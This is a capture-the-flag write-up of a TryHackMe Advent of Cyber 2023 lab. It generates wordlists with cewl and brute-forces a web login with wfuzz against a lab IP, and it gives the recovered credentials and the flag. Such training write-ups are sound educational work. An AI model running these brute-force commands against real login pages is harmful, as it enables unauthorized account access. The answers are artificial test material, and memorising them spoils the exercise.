# Advent of Cyber 2023 - Day 4: Baby, it's CeWLd outside

{% embed url="https://tryhackme.com/room/adventofcyber2023" %}

## Overview & Investigation Walkthrough

In this task we will be using cewl to generate wordlists and wfuzz to brute-force our way into a web application.

1. What is the correct username and password combination? Format username:password

   First, we must create our username and password wordlists using `cewl`. For the username list we will use the `team.php` page and for the password list the homepage.

   ```cmd
   cewl 10.10.95.168/team.php -d 0 -m 5 --lowercase -w usernames.txt
   
   cewl 10.10.95.168 -d 2 -m 5 --with-numbers -w passwords.txt  
   ```

   ![Lists](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D4_Lists.png)

   Now we need to setup our `wfuzz` command. We just need to know what the error message is when logging in with incorrect credentials.

   ![Error Message](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D4_Error_Message.png)

   With this we can use `wfuzz` to find our login credentials.

   ```cmd
   wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.95.168/login.php -d "username=FUZZ&password=FUZ2Z"
   ```

   ![Password](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D4_Password.png)

   ><details><summary>Click for answer</summary>isaias:Happiness</details>

3. What is the flag?

   Now that we have our credentials, we can log into the application and have a look around. Perhaps one of the emails could contain some information.

   ![Flag](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D4_Flag.png)

   ><details><summary>Click for answer</summary>THM{m3rrY4nt4rct1crAft$}</details>

If you enjoyed this task, feel free to check out the [Web Enumeration](https://tryhackme.com/room/webenumerationv2) room.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the correct username and password combination? Format username:password | `isaias:Happiness` |
| What is the flag? | `flag{hidden}` |

> **Note:** Flags are redacted as `flag{hidden}` in accordance with responsible disclosure guidelines. The step-by-step commands above provide the verified reproduction path.
